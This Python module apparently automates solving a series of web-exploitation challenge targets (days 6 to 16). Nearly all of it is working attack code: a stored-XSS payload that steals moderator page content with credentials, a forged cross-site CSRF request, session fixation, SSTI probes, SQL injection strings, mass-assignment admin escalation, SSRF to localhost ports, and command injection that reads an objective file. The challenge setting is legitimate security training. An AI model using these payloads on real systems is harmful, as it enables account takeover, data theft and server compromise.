"""Dedicated fresh-target readers for observed Web days 6 through 16.

Every mutation or exploit request is authorized by structure in the fresh
target's own clue/form/spec responses.  Responses from discovery, controls,
failed attempts, and mutation acknowledgements are subtracted before a single
proof-shaped payoff can be returned.
"""
from __future__ import annotations

import hashlib
import html
import json
import re
import time
from urllib.parse import parse_qsl, quote, unquote, urlencode, urlsplit

from speedrun.solvers.web import EARLY_READERS
from speedrun.web_target import (
    MAX_TARGETS, Response, TargetClient, WebAnswers, prepare_tls_context, proof_tokens,
    solve_fresh_targets, target_identity,
)


FORM = re.compile(r"(?is)<form\b([^>]*)>(.*?)</form\s*>")
ATTR = re.compile(r"(?is)([A-Za-z_:][A-Za-z0-9_.:-]*)\s*=\s*(['\"])(.*?)\2")
SELECT = re.compile(r"(?is)<select\b([^>]*)>(.*?)</select\s*>")
OPTION = re.compile(r"(?is)<option\b([^>]*)>")
INPUT_TAG = re.compile(r"(?is)<input\b([^>]*)>")
RENDER_SLOT = re.compile(r"(?is)<(?:pre|textarea|output)\b[^>]*>(.*?)</(?:pre|textarea|output)\s*>")
IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,40}$")
SAFE_SCALAR = re.compile(r"^[A-Za-z0-9_.:@+-]{1,256}$")
DESTRUCTIVE = re.compile(r"(?i)(?:^|[-_/])(?:delete|destroy|drop|erase|logout|remove|shutdown)(?:[-_/]|$)")
SUPPORTED_DAYS = frozenset(range(6, 17))
TARGET_MODE = True
TARGET_REQUEST_BUDGET = 32
STORED_XSS_SETUP_REQUESTS = 4  # root, clues, OpenAPI, then one fully-derived POST
STORED_XSS_MAX_POLLS = TARGET_REQUEST_BUDGET - STORED_XSS_SETUP_REQUESTS
STORED_XSS_BURST_POLLS = 8
STORED_XSS_POLL_DELAY_CAP = 0.51
# Day 7's qualified moderator receipt can take about 7.2 s. Eight immediate rechecks remove
# avoidable latency when the moderator is already finishing, while the later backoff still spans
# 7.34 s before the final poll. Preserve room for that reader plus serialization/one submit.
TARGET_READY_MINIMUMS = {(7, "time_trial"): 9.0, (7, "mastery"): 9.0}
# Exact counts from the tracked Mastery start responses.
MASTERY_TARGET_COUNTS = {
    6: 2, 7: 2,
    8: 3, 9: 3, 10: 3, 11: 3, 12: 3, 13: 3, 14: 3,
    15: 4, 16: 4,
}


def prepare(_root=None):
    prepare_tls_context()


def _tokens(*responses: Response) -> set[str]:
    found = set()
    for response in responses:
        found.update(proof_tokens(response.body))
    return found


def _one(payoffs, controls) -> str | None:
    eligible = [response for response in payoffs if 200 <= response.status < 300]
    novel = _tokens(*eligible) - _tokens(*controls)
    return next(iter(novel)) if len(novel) == 1 else None


def _stored_xss_poll_delay(poll: int) -> float:
    """Delay after a zero-based failed receipt poll; the first burst is immediate."""
    return min(0.05 * max(0, poll - STORED_XSS_BURST_POLLS + 1),
               STORED_XSS_POLL_DELAY_CAP)


def _text(response: Response) -> str:
    return response.body.decode("utf-8", "replace")


def _same_origin_path(value: str) -> str | None:
    value = html.unescape(str(value)).strip()
    parsed = urlsplit(value)
    if parsed.scheme or parsed.netloc or parsed.fragment or not parsed.path.startswith("/"):
        return None
    return parsed.path + (("?" + parsed.query) if parsed.query else "")


def _json(response: Response):
    try:
        return json.loads(response.body.decode("utf-8"))
    except (UnicodeError, ValueError):
        return None


def _day(ctx: dict) -> int | None:
    value = ctx.get("day")
    if isinstance(value, int) and not isinstance(value, bool):
        return value
    base = str(ctx.get("base") or ctx.get("challenge") or "")
    match = re.search(r"web-exploitation-day-(\d+)-", base)
    return int(match.group(1)) if match else None


def _mode(ctx: dict) -> str | None:
    value = ctx.get("mode")
    if value in ("time_trial", "mastery"):
        return value
    match = re.search(r"/(time_trial|mastery)$", str(ctx.get("challenge") or ""))
    return match.group(1) if match else None


def contract_problem(attempt: dict, ctx: dict) -> str | None:
    """Return a structural refusal reason without opening a target connection."""
    day = _day(ctx)
    if day not in SUPPORTED_DAYS:
        return "unsupported Web day"
    if attempt.get("artifacts") or attempt.get("downloads") or attempt.get("download"):
        return "target contract unexpectedly advertises an artifact delivery"
    mode = _mode(ctx)
    if attempt.get("mode") != mode:
        return f"target contract mode {attempt.get('mode')!r} does not match {mode!r}"
    targets = attempt.get("targets")
    answer_ids = attempt.get("answer_ids")
    questions = attempt.get("questions")
    if not isinstance(targets, list) or not targets or len(targets) > MAX_TARGETS:
        return "missing or oversized fresh target list"
    if not isinstance(answer_ids, list) or not isinstance(questions, list) \
            or len(targets) != len(answer_ids) or len(targets) != len(questions):
        return "target/question/answer cardinality mismatch"
    if mode == "time_trial":
        expected = 1
    elif mode == "mastery":
        expected = MASTERY_TARGET_COUNTS.get(day)
    else:
        expected = None
    if expected is None or len(targets) != expected:
        return f"saved {mode!r} contract expects {expected} target(s), got {len(targets)}"
    seen = set()
    identities = set()
    for target, aid, question in zip(targets, answer_ids, questions):
        if not isinstance(target, dict) or not isinstance(question, dict) \
                or not isinstance(aid, str) or not aid or aid in seen:
            return "ambiguous target/question/answer row"
        if question.get("id") and str(question["id"]) != aid:
            return "question id does not match answer id"
        if target.get("id") and question.get("artifact") \
                and str(target["id"]) != str(question["artifact"]):
            return "target id does not match question artifact"
        try:
            identity = target_identity(target.get("url"))
        except Exception as exc:
            return f"target URL is not an allowed fresh HTTP(S) origin: {exc}"
        if identity in identities:
            return "multiple answer ids name the same assigned target"
        identities.add(identity)
        seen.add(aid)
    return None


def _attrs(source: str) -> dict[str, str]:
    return {name.lower(): html.unescape(value) for name, _quote, value in ATTR.findall(source)}


def _route(value, *, template: bool = False) -> str | None:
    if not isinstance(value, str):
        return None
    path = _same_origin_path(value)
    if path is None or "?" in path or "\\" in path or len(path) > 1024:
        return None
    decoded = path
    for _ in range(3):
        newer = unquote(decoded)
        if newer == decoded:
            break
        decoded = newer
    low = decoded.lower()
    if "//" in decoded or "://" in low or DESTRUCTIVE.search(low):
        return None
    if template:
        if decoded.count("{id}") != 1 or re.search(r"[{}]", decoded.replace("{id}", "")):
            return None
    elif "{" in decoded or "}" in decoded:
        return None
    return path


def _origin(client: TargetClient) -> str:
    host = client.host
    if ":" in host and not host.startswith("["):
        host = "[" + host + "]"
    default = 443 if client.scheme == "https" else 80
    return f"{client.scheme}://{host}" + ((":" + str(client.port)) if client.port != default else "")


def _root_and_clues(client: TargetClient):
    root = client.get(client.root)
    clues_response = client.get("/api/clues")
    clues = _json(clues_response)
    if not isinstance(clues, dict):
        return root, clues_response, None
    return root, clues_response, clues


def _post_json(client: TargetClient, path: str, value: dict) -> Response:
    return client.post(path, body=json.dumps(value, separators=(",", ":")),
                       headers={"Content-Type": "application/json"})


def _post_form(client: TargetClient, path: str, value: dict) -> Response:
    return client.post(path, body=urlencode(value),
                       headers={"Content-Type": "application/x-www-form-urlencoded"})


def _rendered(response: Response) -> list[str]:
    out = []
    for raw in RENDER_SLOT.findall(_text(response)):
        value = html.unescape(re.sub(r"(?is)<[^>]+>", "", raw)).strip()
        if value and value not in out:
            out.append(value)
    return out[:8]


def _body_response(response: Response, values: list[str]) -> Response:
    return Response(response.status, response.headers, "\n".join(values).encode("utf-8"))


def _callback(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    feature = _route(clues.get("feature_route"))
    secondary = _route(clues.get("secondary_route"))
    nonce = clues.get("callback_nonce")
    if secondary is None or not isinstance(nonce, str) or not SAFE_SCALAR.fullmatch(nonce):
        return None
    controls = [root, clues_response]
    if feature:
        controls.append(client.get(feature))
    headers = {
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty", "Origin": _origin(client),
        "Referer": _origin(client) + (feature or "/") + "?q=x",
    }
    for param in ("nonce", "token", "cb", "callback", "code", "callback_nonce"):
        response = client.get(secondary + "?" + urlencode({param: nonce}), headers=headers)
        answer = _one([response], controls)
        if answer is not None:
            return answer
        controls.append(response)
    return None


def _stored_xss(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    spec_response = client.get("/openapi.json")
    spec = _json(spec_response)
    if clues is None or not isinstance(spec, dict):
        return None
    feature = _route(clues.get("feature_route"))
    moderator_values = [_route(clues[key]) for key in ("moderator_data_route", "moderator_route")
                        if key in clues]
    receipt_values = [_route(clues[key], template=True)
                      for key in ("receipt_route_template", "receipt_route") if key in clues]
    moderator = moderator_values[0] if moderator_values and None not in moderator_values \
        and len(set(moderator_values)) == 1 else None
    receipt = receipt_values[0] if receipt_values and None not in receipt_values \
        and len(set(receipt_values)) == 1 else None
    paths = spec.get("paths")
    posts = []
    if isinstance(paths, dict):
        for raw, methods in paths.items():
            path = _route(raw)
            if path and isinstance(methods, dict) and "post" in {str(key).lower() for key in methods} \
                    and re.search(r"(?i)(?:message|note|postcard)", path):
                posts.append(path)
    if feature is None or moderator is None or receipt is None or len(posts) != 1:
        return None
    before, after = receipt.split("{id}", 1)
    receipt_expr = json.dumps(before) + "+encodeURIComponent(i)+" + json.dumps(after)
    script = ("var i=location.pathname.split('/').pop();fetch(%s,{credentials:'include'})"
              ".then(r=>r.text()).then(t=>fetch(%s,{method:'POST',credentials:'include',"
              "headers:{'Content-Type':'application/json'},body:JSON.stringify({evidence:t,data:t,"
              "content:t,receipt:t})}))") % (json.dumps(moderator), receipt_expr)
    payload = "<script>" + script + "</script><img src=x onerror=" + json.dumps(script) + ">"
    posted = _post_json(client, posts[0], {"name": "n", "message": payload})
    doc = _json(posted)
    controls = [root, clues_response, spec_response, posted]
    if not isinstance(doc, dict):
        return None
    note = _route(doc.get("url"))
    if note is None and doc.get("id") is not None:
        ident = str(doc["id"])
        if re.fullmatch(r"[A-Za-z0-9_-]{1,80}", ident):
            note = feature.rstrip("/") + "/" + quote(ident, safe="")
    if note is None:
        return None
    # The real family queues a same-origin moderator browser.  Poll only after
    # the fully-derived payload was accepted; each pending page stays a control.  Four setup
    # requests are structurally fixed above, so use every remaining request in this target's
    # bounded budget. The immediate burst catches an already-finishing moderator without a
    # client-side wait; the later backoff still places the final poll after 7.34 seconds, covering
    # the slowest preserved moderator receipt (about 7.2 seconds) without guessing.
    if client.requests != STORED_XSS_SETUP_REQUESTS:
        return None
    polls = min(STORED_XSS_MAX_POLLS, max(0, client.max_requests - client.requests))
    for poll in range(polls):
        response = client.get(note)
        answer = _one([response], controls)
        if answer is not None:
            return answer
        controls.append(response)
        delay = _stored_xss_poll_delay(poll)
        if poll + 1 == polls or client.deadline - time.time() <= delay + 0.10:
            break
        if delay:
            time.sleep(delay)
    return None


def _session_fixation(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    feature = _route(clues.get("feature_route"))
    secondary = _route(clues.get("secondary_route"))
    hint = clues.get("session_hint")
    if feature is None or secondary is None or not isinstance(hint, str) \
            or not SAFE_SCALAR.fullmatch(hint):
        return None
    controls = [root, clues_response, client.get(feature), client.get(secondary)]
    for param in ("sid", "session", "session_id", "sessionid", "sess", "s", "token"):
        plant = client.get(feature + "?" + urlencode({param: hint}))
        controls.append(plant)
        status = client.get(secondary)
        answer = _one([status], controls)
        if answer is not None:
            return answer
        controls.append(status)
    return None


def _csrf(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    prefs = _route(clues.get("preferences_route"))
    feature = _route(clues.get("feature_route"))
    if prefs is None or feature is None:
        return None
    page = client.get(prefs)
    raw_forms = FORM.findall(_text(page))
    get_forms = []
    for raw_attrs, body in raw_forms:
        attrs = _attrs(raw_attrs)
        if attrs.get("method", "GET").upper() == "GET":
            get_forms.append((attrs, body))
    if len(get_forms) != 1:
        return None
    attrs, body = get_forms[0]
    action = _route(attrs.get("action") or prefs)
    if action is None:
        return None
    fields = {}
    for raw in INPUT_TAG.findall(body):
        values = _attrs(raw)
        if IDENT.fullmatch(values.get("name", "")) and "value" in values:
            fields[values["name"]] = values["value"]
    destination = None
    destination_name = None
    for raw, options_body in SELECT.findall(body):
        values = _attrs(raw)
        name = values.get("name", "")
        options = [_attrs(option).get("value") for option in OPTION.findall(options_body)]
        options = [value for value in options if isinstance(value, str)]
        external = next((value for value in options
                         if "@" in value or "outside" in value.lower() or "invalid" in value.lower()), None)
        if IDENT.fullmatch(name) and external is not None:
            if destination is not None:
                return None
            destination_name, destination = name, external
    if destination_name is None or len(destination) > 512:
        return None
    status_route = prefs if prefs.startswith("/api/") else "/api" + prefs
    status_route = _route(status_route)
    if status_route is None:
        return None
    controls = [root, clues_response, page, client.get(status_route)]
    values = {destination_name: destination}
    if "csrf_token" in fields:
        values["csrf_token"] = fields["csrf_token"]
    forged = client.get(action + "?" + urlencode(values), headers={
        "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document", "Origin": "https://attacker.invalid",
        "Referer": "https://attacker.invalid/forge",
    })
    after = client.get(status_route)
    return _one([forged, after], controls)


def _upload_render_path(doc, render: str, filename: str) -> str | None:
    if not isinstance(doc, dict) or not isinstance(doc.get("path"), str):
        return None
    offered = _same_origin_path(doc["path"])
    if offered is None:
        return None
    parsed = urlsplit(offered)
    try:
        pairs = parse_qsl(parsed.query, keep_blank_values=True, strict_parsing=True)
    except ValueError:
        return None
    if parsed.path != render or pairs != [("file", filename)]:
        return None
    return offered


def _upload(client: TargetClient, attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    feature = _route(clues.get("feature_route"))
    render = _route(clues.get("render_route"))
    guide_path = _route(clues.get("preview_guide"))
    shape = str(clues.get("upload_shape") or "")
    if feature is None or render is None or guide_path is None \
            or not all(word in shape.lower() for word in ("post", "filename", "content", "content_type")):
        return None
    guide = client.get(guide_path)
    code_names = re.findall(r"(?is)<code\b[^>]*>\s*([A-Za-z_][A-Za-z0-9_]{0,40})\s*</code\s*>",
                            _text(guide))
    if len(set(code_names)) != 1:
        return None
    content = "{{" + code_names[0] + "}}"
    attempt_id = str(attempt.get("attempt_id") or attempt.get("attempt") or "fresh-target")
    suffix = hashlib.sha256(attempt_id.encode("utf-8", "replace")).hexdigest()[:10]
    controls = [root, clues_response, guide]
    for extension, payoff in (("txt", False), ("html", True)):
        filename = "objproof-" + suffix + "." + extension
        posted = _post_json(client, feature, {
            "filename": filename, "content": content, "content_type": "text/html",
        })
        controls.append(posted)
        path = _upload_render_path(_json(posted), render, filename)
        if path is None:
            return None
        shown = client.get(path)
        if not payoff:
            controls.append(shown)
            continue
        return _one([shown], controls)
    return None


def _ssti(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    feature = _route(clues.get("feature_route"))
    if feature is None:
        return None
    feature_response = client.get(feature)
    if feature_response.status != 200 or not RENDER_SLOT.search(_text(feature_response)):
        return None
    field_values = [clues.get(key) for key in
                    ("template_field", "body_field", "message_field", "input_field", "field")]
    fields = [value for value in field_values if isinstance(value, str) and IDENT.fullmatch(value)]
    field = fields[0] if len(set(fields)) == 1 else ("template" if not fields else None)
    if field is None:
        return None
    transport = "json" if "json" in str(clues.get("content_type") or "").lower() else "form"
    controls = [root, clues_response, feature_response]
    product = str(7213 * 4567)
    syntaxes = (("{{", "}}"), ("${", "}"), ("#{", "}"), ("<%= ", " %>"))
    for prefix, suffix in syntaxes:
        marker = prefix + "7213*4567" + suffix
        confirm = (_post_json if transport == "json" else _post_form)(client, feature, {field: marker})
        rendered = _rendered(confirm)
        controls.append(confirm)
        if confirm.status < 200 or confirm.status >= 300 or product not in rendered:
            continue
        objective = prefix + "objective" + suffix
        payoff = (_post_json if transport == "json" else _post_form)(client, feature, {field: objective})
        values = [value for value in _rendered(payoff) if value != objective]
        return _one([_body_response(payoff, values)], controls)
    return None


def _second_order(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    feature = _route(clues.get("feature_route"))
    secondary = _route(clues.get("secondary_route"))
    if feature is None or secondary is None:
        return None
    feature_response = client.get(feature)
    baseline = client.get(secondary)
    fdoc, bdoc = _json(feature_response), _json(baseline)
    if not isinstance(fdoc, dict) or "post_required" not in str(fdoc.get("error") or "").lower() \
            or baseline.status != 200 or not isinstance(bdoc, dict) \
            or bdoc.get("effect") != "delayed_query_revealed_private_row" \
            or not isinstance(bdoc.get("rows"), list):
        return None
    fields = [clues.get(key) for key in
              ("filter_parameter", "filter_field", "input_parameter", "body_field", "field")]
    fields = [value for value in fields if isinstance(value, str) and IDENT.fullmatch(value)]
    field = fields[0] if len(set(fields)) == 1 else ("filter" if not fields else None)
    if field is None:
        return None
    transport = "form" if "form" in str(clues.get("content_type") or "").lower() else "json"
    old_rows = [str(value) for value in bdoc["rows"]]
    controls = [root, clues_response, feature_response, baseline]
    for payload in ("' OR 1=1-- -", '" OR 1=1-- -', "' OR '1'='1'-- -", '" OR "1"="1"-- -'):
        ack = (_post_form if transport == "form" else _post_json)(client, feature, {field: payload})
        controls.append(ack)
        if ack.status < 200 or ack.status >= 300:
            continue
        readback = client.get(secondary)
        doc = _json(readback)
        rows = [str(value) for value in doc.get("rows", [])] if isinstance(doc, dict) \
            and isinstance(doc.get("rows"), list) else []
        new_rows = [value for value in rows if value not in old_rows]
        if isinstance(doc, dict) and doc.get("effect") == "delayed_query_revealed_private_row" \
                and new_rows and all(value in rows for value in old_rows):
            answer = _one([_body_response(readback, new_rows)], controls)
            if answer is not None:
                return answer
        controls.append(readback)
        if rows:
            old_rows = rows
    return None


def _mass_assignment(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None or str(clues.get("current_role") or "").lower() not in \
            {"analyst", "user", "member", "viewer", "guest"}:
        return None
    feature = _route(clues.get("feature_route"))
    secondary = _route(clues.get("secondary_route"))
    if feature is None or secondary is None:
        return None
    feature_response = client.get(feature)
    baseline = client.get(secondary)
    fdoc, bdoc = _json(feature_response), _json(baseline)
    if not isinstance(fdoc, dict) or "post_required" not in str(fdoc.get("error") or "").lower() \
            or baseline.status not in (401, 403) or not isinstance(bdoc, dict) \
            or not re.search(r"admin(?:istrator)?_required", str(bdoc.get("error") or ""), re.I):
        return None
    controls = [root, clues_response, feature_response, baseline]
    payloads = (
        {"name": "attacker", "is_admin": True},
        {"name": "attacker", "role": "administrator"},
        {"name": "attacker", "isAdmin": True},
        {"name": "attacker", "admin": True},
        {"name": "attacker", "is_administrator": True},
    )
    for payload in payloads:
        ack = _post_json(client, feature, payload)
        controls.append(ack)
        if ack.status < 200 or ack.status >= 300:
            continue
        readback = client.get(secondary)
        doc = _json(readback)
        if readback.status in range(200, 300) and isinstance(doc, dict) \
                and doc.get("effect") == "bound_privileged_property" \
                and (doc.get("ok") is True or doc.get("administrator") is True):
            answer = _one([readback], controls)
            if answer is not None:
                return answer
        controls.append(readback)
    return None


def _access(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None

    def aliases(source, names, normalize):
        if not isinstance(source, dict):
            return None, True, False
        present = False
        values = []
        for name in names:
            if name not in source:
                continue
            present = True
            value = normalize(source[name])
            if value is None:
                return None, False, True
            if value not in values:
                values.append(value)
        if not present:
            return None, True, False
        return (values[0], True, True) if len(values) == 1 else (None, False, True)

    def reference(value):
        if isinstance(value, bool) or not isinstance(value, (str, int)):
            return None
        text = str(value)
        if not text or len(text.encode("utf-8", "strict")) > 1024 \
                or any(ord(char) < 0x20 for char in text):
            return None
        return text

    def string_list(value):
        if not isinstance(value, list) or not value or len(value) > 64:
            return None
        out = []
        for item in value:
            if not isinstance(item, str) or not SAFE_SCALAR.fullmatch(item):
                return None
            out.append(item)
        return tuple(out)

    feature, feature_ok, feature_present = aliases(clues, ("feature_route",), _route)
    inventory_path, inventory_ok, inventory_present = aliases(
        clues, ("inventory_route", "inventory"), _route)
    if not feature_ok or not feature_present or not inventory_ok or not inventory_present:
        return None
    inventory_response = client.get(inventory_path)
    inventory = _json(inventory_response)
    if not isinstance(inventory, dict):
        return None
    inv_feature, inv_feature_ok, inv_feature_present = aliases(inventory, ("route",), _route)
    if not inv_feature_ok or not inv_feature_present or inv_feature != feature:
        return None

    families = {}
    for label, names in (
            ("fields", ("fields",)),
            ("actions", ("actions",)),
            ("params", ("query_parameters", "query_params", "parameters"))):
        clue_value, clue_ok, clue_present = aliases(clues, names, string_list)
        inv_value, inv_ok, inv_present = aliases(inventory, names, string_list)
        if not clue_ok or not inv_ok or not inv_present \
                or (clue_present and clue_value != inv_value):
            return None
        families[label] = inv_value
    fields = list(families["fields"])
    actions = list(families["actions"])
    params = list(families["params"])
    if len(params) != 3:
        return None

    reference_keys = ("protected_reference", "protected_ref", "protected_id", "protectedReference")
    clue_ref, clue_ref_ok, clue_ref_present = aliases(clues, reference_keys, reference)
    inv_ref, inv_ref_ok, inv_ref_present = aliases(inventory, reference_keys, reference)
    if not clue_ref_ok or not inv_ref_ok or (clue_ref_present and inv_ref_present and clue_ref != inv_ref) \
            or not (clue_ref_present or inv_ref_present):
        return None
    protected = clue_ref if clue_ref_present else inv_ref

    id_names = [v for v in params if v.lower() == "id" or v.lower().endswith("_id") or "reference" in v.lower()]
    field_names = [v for v in params if "field" in v.lower() or "select" in v.lower() or "column" in v.lower()]
    action_names = [v for v in params if "action" in v.lower() or "operation" in v.lower() or v.lower() == "op"]
    if not (len(id_names) == len(field_names) == len(action_names) == 1) \
            or len({id_names[0], field_names[0], action_names[0]}) != 3:
        return None
    controls = [root, clues_response, inventory_response]
    sample = inventory.get("sample")
    if isinstance(sample, dict) and set(sample) == set(params):
        controls.append(client.get(feature + "?" + urlencode([(name, sample[name]) for name in params])))
    for field in fields:
        for action in actions:
            if DESTRUCTIVE.search("/" + action):
                continue
            values = {id_names[0]: str(protected), field_names[0]: field, action_names[0]: action}
            response = client.get(feature + "?" + urlencode([(name, values[name]) for name in params]))
            doc = _json(response)
            if response.status in range(200, 300) and isinstance(doc, dict) \
                    and doc.get("effect") == "api_field_action_authorization_bypassed":
                answer = _one([response], controls)
                if answer is not None:
                    return answer
            controls.append(response)
    return None


def _ssrf(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    feature = _route(clues.get("feature_route"))
    secondary = _route(clues.get("secondary_route"))
    if feature is None or secondary is None:
        return None
    probe = client.get(feature)
    direct = client.get(secondary)
    doc = _json(probe)
    error = str(doc.get("error") or "") if isinstance(doc, dict) else ""
    if not re.search(r"(?:absolute_)?url_(?:required|missing|needed)", error, re.I):
        return None
    explicit = clues.get("input_parameter")
    params = [explicit] if isinstance(explicit, str) and IDENT.fullmatch(explicit) else []
    # The recorded contract used ``url``.  Keep that proven fast path first,
    # while retaining target/error-derived names for rotated shapes.
    params.append("url")
    match = re.search(r"([a-z][a-z0-9_]*)_(?:required|missing|needed)", error.lower())
    if match and IDENT.fullmatch(match.group(1)):
        params.append(match.group(1))
        params.append(match.group(1).replace("_", ""))
    params.extend(("uri", "target", "dest", "link", "fetch", "feed",
                   "remote", "endpoint", "resource", "absolute_url"))
    params = list(dict.fromkeys(params))
    controls = [root, clues_response, probe, direct]
    for param in params:
        for port in (8080, 5000, 8000, 3000, 80):
            inner = f"http://127.0.0.1:{port}{secondary}"
            response = client.get(feature + "?" + urlencode({param: inner}))
            response_doc = _json(response)
            if response.status in range(200, 300) and isinstance(response_doc, dict) \
                    and response_doc.get("effect") == "internal_service_reached" \
                    and response_doc.get("ok") is True:
                answer = _one([response], controls)
                if answer is not None:
                    return answer
            controls.append(response)
            failed_doc = _json(response)
            if isinstance(failed_doc, dict) and re.search(
                    r"(?:absolute_)?url_(?:required|missing|needed)",
                    str(failed_doc.get("error") or ""), re.I):
                break
    return None


def _command_injection(client: TargetClient, _attempt: dict) -> str | None:
    root, clues_response, clues = _root_and_clues(client)
    if clues is None:
        return None
    feature = _route(clues.get("feature_route"))
    param = clues.get("input_parameter")
    example = clues.get("example_path")
    if feature is None or not isinstance(param, str) or not IDENT.fullmatch(param) \
            or not isinstance(example, str) or len(example) > 512:
        return None
    probe = client.get(feature)
    example_response = client.get(feature + "?" + urlencode({param: example}))
    marker = "hx7a19''$((7213*4567))tail9"
    expected = "hx7a19" + str(7213 * 4567) + "tail9"
    confirm = client.get(feature + "?" + urlencode({param: "echo " + marker}))
    confirm_doc = _json(confirm)
    controls = [root, clues_response, probe, example_response, confirm]
    if not isinstance(confirm_doc, dict) or confirm_doc.get("effect") != "worker_command_completed" \
            or confirm_doc.get("stdout") != expected:
        return None
    payoff = client.get(feature + "?" + urlencode({param: "cat /run/huntress/objective.txt"}))
    payoff_doc = _json(payoff)
    if not isinstance(payoff_doc, dict) or payoff_doc.get("effect") != "worker_command_completed":
        return None
    stdout = payoff_doc.get("stdout")
    if not isinstance(stdout, str):
        return None
    return _one([_body_response(payoff, [stdout])], controls)


READERS = {
    6: _callback,
    7: _stored_xss,
    8: _session_fixation,
    9: _csrf,
    10: _upload,
    11: _ssti,
    12: _second_order,
    13: _mass_assignment,
    14: _access,
    15: _ssrf,
    16: _command_injection,
}


def solve_target(attempt: dict, ctx: dict) -> WebAnswers:
    """Fresh-target entry point used by the future Web runner integration."""
    if contract_problem(attempt, ctx) is not None:
        return WebAnswers()
    deadline = ctx.get("deadline")
    if not isinstance(deadline, (int, float)) or isinstance(deadline, bool):
        return WebAnswers()
    day = _day(ctx)
    if day not in READERS:
        return WebAnswers()
    try:
        requested_budget = int(ctx.get("max_requests") or TARGET_REQUEST_BUDGET)
    except (TypeError, ValueError):
        return WebAnswers()
    request_budget = max(1, min(requested_budget, TARGET_REQUEST_BUDGET))
    total = len(attempt["targets"])

    def reader(client, current, index):
        # Real Masteries are cumulative bundles: slots before the final one
        # are the corresponding early family (1=backup, 2=IDOR, 3=SQLi).
        family = day if index == total else index
        selected = READERS.get(family) or EARLY_READERS.get(family)
        return selected(client, current) if selected is not None else None

    values = solve_fresh_targets(
        attempt, reader, deadline=float(deadline), max_requests=request_budget, indexed=True)
    answers = WebAnswers(values)
    answers.target_requests = values.target_requests
    return answers
